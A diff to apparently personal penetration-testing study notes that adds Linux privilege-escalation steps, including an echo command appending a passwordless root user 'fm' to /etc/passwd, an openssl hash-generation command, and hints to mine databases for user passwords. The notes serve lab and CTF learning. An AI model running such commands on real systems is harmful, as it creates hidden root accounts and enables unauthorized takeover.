@@ -25,11 +25,16 @@ Notes related to Vuln Assmnt/PenTesting
 > 1. Creds file or any misconfiguration file? (**find or grep** command)
 > 1. SUDO commands this user can run ? (try running sudo -l) 
 > 1. SUID binaries present (use **find** command or **suid3num python** script)
-> 1. Is there SQL database, try enumerating it ?
+> 1. Is there SQL database, try enumerating it ? Maybe it has linux user password in it ? 
 > 1. Running ports / services on this box ? (use **netstat** or **ss** command)
 > 1. Pspy ?
 > 1. Kernel or other exploits e.g. exploits for SUDO ?
 > 1. **Linpeas** or **LinEnum** or **Linux Exploit Suggester**
+
+#### PrivESC Methodology for Linux - /etc/passwd && /etc/shadow
+> 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
+> 1. Making user **fm** the root by typing command ->  echo fm::0:0:root:/root:/bin/bash >> /etc/passwd
+> 1. openssl for generating password hashes command -> openssl passwd -1
 
 #### cgi-bin folder or ShellShock
 > e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
